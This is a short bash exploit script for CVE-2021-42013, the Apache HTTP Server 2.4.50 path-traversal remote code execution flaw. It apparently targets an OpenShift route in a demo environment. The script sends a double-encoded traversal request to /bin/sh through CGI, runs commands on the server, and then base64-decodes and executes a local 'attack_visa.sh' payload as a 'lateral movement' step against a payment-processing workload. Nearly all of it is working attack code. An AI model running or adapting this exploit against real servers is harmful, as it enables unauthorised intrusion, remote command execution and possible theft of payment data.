# Exploit: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)
# Credits: Ash Daulton & cPanel Security Team
# Date: 24/07/2021
# Exploit Author: TheLastVvV.com
# Vendor Homepage:  https://apache.org/
# Version: Apache 2.4.50 with CGI enable
# Tested on : Debian 5.10.28
# CVE : CVE-2021-42013

#!/bin/bash

target=$(oc -n frontend get route/asset-cache --output jsonpath={.spec.host})
#attach visa deployment
inject=$(cat $(dirname -- "$0")/templates/attack_visa.sh | base64)

echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'

function curl_target(){
curl -s "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
}

function attack(){
export hostname=$(curl_target $1 "cat /etc/hostname")
echo $hostname | grep -q "<html>" && echo '☹ - Target not Vulnerable' && exit || echo "☺ - Target ${hostname} Exploited" && pivot $1 || echo '☹ - Exploit FAILED'
}

function pivot(){
echo "☺ - Next Phase: Lateral Movement ..."
echo "☺ - Exploiting visa-processor workload ..."
curl_target $1 "echo '${inject}' | base64 -d | bash -"
}

attack $target
